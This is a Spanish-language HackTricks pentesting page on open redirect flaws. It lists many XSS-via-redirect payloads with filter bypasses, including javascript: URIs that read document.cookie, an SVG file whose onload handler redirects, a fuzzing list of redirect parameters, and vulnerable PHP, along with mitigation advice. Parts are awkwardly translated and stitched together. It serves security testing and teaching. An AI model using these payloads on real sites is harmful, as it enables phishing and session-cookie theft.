<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# Redirecci√≥n abierta

## Redirecci√≥n a localhost o dominios arbitrarios

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

## Redirecci√≥n abierta a XSS
```bash
#Basic payload, javascript code is executed after "javascript:"
javascript:alert(1)

#Bypass "javascript" word filter with CRLF
java%0d%0ascript%0d%0a:alert(0)

#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
#This bypasses FILTER_VALIDATE_URL os PHP
javascript://%250Aalert(1)

#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

#Others
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
";alert(0);//
```
# Redirecci√≥n abierta al cargar archivos svg

## Descripci√≥n

La redirecci√≥n abierta es una vulnerabilidad que permite a un atacante redirigir a la v√≠ctima a cualquier sitio web externo. Esta vulnerabilidad se produce cuando una aplicaci√≥n web utiliza una entrada no validada para construir una URL que redirige a un sitio externo.

En este caso, la vulnerabilidad se produce al cargar archivos svg. Al cargar un archivo svg malicioso, un atacante puede aprovechar la vulnerabilidad de redirecci√≥n abierta para redirigir a la v√≠ctima a un sitio web malicioso.

## Ejemplo

Supongamos que una aplicaci√≥n web tiene una funci√≥n de carga de archivos svg y utiliza una entrada no validada para construir la URL de la imagen. El c√≥digo podr√≠a verse as√≠:

```html
<img src="https://example.com/load_image.php?url=<%= params[:url] %>" />
```

En este caso, el par√°metro `url` no est√° validado, lo que significa que un atacante puede proporcionar una URL maliciosa que redirigir√° a la v√≠ctima a un sitio web malicioso. Por ejemplo, el atacante podr√≠a proporcionar la siguiente URL:

```
https://example.com/load_image.php?url=https://malicious.com
```

Cuando la v√≠ctima carga la p√°gina, se redirigir√° autom√°ticamente a `https://malicious.com`.

## Prevenci√≥n

Para prevenir la vulnerabilidad de redirecci√≥n abierta al cargar archivos svg, se deben seguir las siguientes pr√°cticas recomendadas:

- Validar todas las entradas del usuario antes de utilizarlas para construir una URL.
- Utilizar una lista blanca de dominios permitidos para las URL de redirecci√≥n.
- No permitir que los usuarios carguen archivos svg de fuentes no confiables.
- Utilizar una pol√≠tica de seguridad de contenido adecuada para evitar la ejecuci√≥n de scripts maliciosos en archivos svg.
```markup
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='http://www.example.com'"
xmlns="http://www.w3.org/2000/svg">
</svg>
</code>
```
# Par√°metros comunes de inyecci√≥n

## Description

## Descripci√≥n

Open redirect vulnerabilities can be found in any web application that allows users to be redirected to external URLs. These vulnerabilities can be used by attackers to craft malicious links that, when clicked, redirect the user to a phishing site or a site hosting malware.

Las vulnerabilidades de redirecci√≥n abierta se pueden encontrar en cualquier aplicaci√≥n web que permita a los usuarios ser redirigidos a URLs externas. Estas vulnerabilidades pueden ser utilizadas por atacantes para crear enlaces maliciosos que, al hacer clic en ellos, redirigen al usuario a un sitio de phishing o a un sitio que aloja malware.

One common way to exploit open redirect vulnerabilities is to inject a malicious URL as a parameter in the application's redirect function. The following are some common injection parameters that can be used to test for open redirect vulnerabilities:

Una forma com√∫n de explotar las vulnerabilidades de redirecci√≥n abierta es inyectar una URL maliciosa como par√°metro en la funci√≥n de redirecci√≥n de la aplicaci√≥n. A continuaci√≥n se presentan algunos par√°metros de inyecci√≥n comunes que se pueden utilizar para probar las vulnerabilidades de redirecci√≥n abierta:

- `url`
- `redirect`
- `return`
- `returnTo`
- `rurl`
- `dest`
- `destination`
- `redir`
- `redirect_uri`
- `redirect_url`

It's important to note that this is not an exhaustive list and that other parameters may also be vulnerable to open redirect attacks.

Es importante tener en cuenta que esta no es una lista exhaustiva y que otros par√°metros tambi√©n pueden ser vulnerables a ataques de redirecci√≥n abierta.
```
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
success=https://c1h2e1.github.io
data=https://c1h2e1.github.io
qurl=https://c1h2e1.github.io
login=https://c1h2e1.github.io
logout=https://c1h2e1.github.io
ext=https://c1h2e1.github.io
clickurl=https://c1h2e1.github.io
goto=https://c1h2e1.github.io
rit_url=https://c1h2e1.github.io
forward_url=https://c1h2e1.github.io
@https://c1h2e1.github.io
forward=https://c1h2e1.github.io
pic=https://c1h2e1.github.io
callback_url=https://c1h2e1.github.io
jump=https://c1h2e1.github.io
jump_url=https://c1h2e1.github.io
click?u=https://c1h2e1.github.io
originUrl=https://c1h2e1.github.io
origin=https://c1h2e1.github.io
Url=https://c1h2e1.github.io
desturl=https://c1h2e1.github.io
u=https://c1h2e1.github.io
page=https://c1h2e1.github.io
u1=https://c1h2e1.github.io
action=https://c1h2e1.github.io
action_url=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
sp_url=https://c1h2e1.github.io
service=https://c1h2e1.github.io
recurl=https://c1h2e1.github.io
j?url=https://c1h2e1.github.io
url=//https://c1h2e1.github.io
uri=https://c1h2e1.github.io
u=https://c1h2e1.github.io
allinurl:https://c1h2e1.github.io
q=https://c1h2e1.github.io
link=https://c1h2e1.github.io
src=https://c1h2e1.github.io
tc?src=https://c1h2e1.github.io
linkAddress=https://c1h2e1.github.io
location=https://c1h2e1.github.io
burl=https://c1h2e1.github.io
request=https://c1h2e1.github.io
backurl=https://c1h2e1.github.io
RedirectUrl=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
ReturnUrl=https://c1h2e1.github.io
```
# Ejemplos de c√≥digo

### .Net
```bash
response.redirect("~/mysafe-subdomain/login.aspx")
```
### Java

### Descripci√≥n

Java es un lenguaje de programaci√≥n orientado a objetos y multiplataforma. Es utilizado en una gran variedad de aplicaciones, desde aplicaciones de escritorio hasta aplicaciones web y m√≥viles. Java es muy popular en el desarrollo de aplicaciones empresariales y es utilizado en muchos sistemas de backend.

### Vulnerabilidades

#### Open Redirect

Java tambi√©n es vulnerable a la vulnerabilidad de Open Redirect. Esta vulnerabilidad permite a un atacante redirigir a un usuario a un sitio web malicioso a trav√©s de una URL manipulada. Esto puede ser utilizado para phishing o para redirigir a un usuario a un sitio web malicioso que contenga malware.

Para explotar esta vulnerabilidad, el atacante debe encontrar una p√°gina que tenga un par√°metro de redirecci√≥n que no est√© validado adecuadamente. El atacante puede entonces manipular el valor del par√°metro para redirigir al usuario a un sitio web malicioso.

#### Ejemplo

```
https://example.com/redirect?url=http://malicious-site.com
```

En este ejemplo, el par√°metro `url` se utiliza para redirigir al usuario a una URL espec√≠fica. Si el valor del par√°metro no est√° validado adecuadamente, un atacante puede manipularlo para redirigir al usuario a un sitio web malicioso.

#### Prevenci√≥n

Para prevenir la vulnerabilidad de Open Redirect, se debe validar adecuadamente cualquier entrada de usuario que se utilice para redirigir a un usuario a otra p√°gina. Esto puede incluir la validaci√≥n de la URL de destino para asegurarse de que es un sitio web leg√≠timo y la validaci√≥n del dominio de la URL de destino para asegurarse de que es el dominio correcto.
```bash
response.redirect("http://mysafedomain.com");
```
### PHP

### Descripci√≥n

PHP es un lenguaje de programaci√≥n de c√≥digo abierto muy popular utilizado para el desarrollo de aplicaciones web. Es compatible con una amplia variedad de bases de datos y se ejecuta en la mayor√≠a de los sistemas operativos.

### Vulnerabilidades

#### Redirecci√≥n abierta

Una vulnerabilidad com√∫n en las aplicaciones web PHP es la redirecci√≥n abierta. Esto ocurre cuando una aplicaci√≥n permite que un usuario redirija a cualquier URL sin verificar si la URL es segura o no. Esto puede ser explotado por un atacante para redirigir a la v√≠ctima a un sitio malicioso.

Ejemplo:

```
<?php
$redirect_url = $_GET['url'];
header("Location: $redirect_url");
?>
```

En este ejemplo, el valor de `$_GET['url']` se utiliza para redirigir al usuario a la URL especificada. Si un atacante proporciona una URL maliciosa, la v√≠ctima ser√° redirigida a ese sitio.

### Ejemplo de explotaci√≥n

Supongamos que una aplicaci√≥n PHP tiene una p√°gina de inicio de sesi√≥n que redirige al usuario a la p√°gina principal despu√©s de iniciar sesi√≥n. La URL de redirecci√≥n se especifica en el par√°metro `redirect_url` en la URL de inicio de sesi√≥n. Si la aplicaci√≥n no valida la URL de redirecci√≥n, un atacante podr√≠a proporcionar una URL maliciosa que redirigir√≠a al usuario a un sitio malicioso despu√©s de iniciar sesi√≥n.

```
http://example.com/login.php?redirect_url=http://malicious-site.com
```

En este ejemplo, el atacante ha proporcionado una URL maliciosa que redirigir√° al usuario a `http://malicious-site.com` despu√©s de iniciar sesi√≥n. Si la aplicaci√≥n no valida la URL de redirecci√≥n, el ataque tendr√° √©xito y la v√≠ctima ser√° redirigida a un sitio malicioso.
```php
<?php
/* browser redirections*/
header("Location: http://mysafedomain.com");
exit;
?>
```
# Herramientas

* [https://github.com/0xNanda/Oralyzer](https://github.com/0xNanda/Oralyzer)

# Recursos

En [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect) puedes encontrar listas de fuzzing.\
[https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)\
[https://github.com/cujanovic/Open-Redirect-Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obt√©n la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
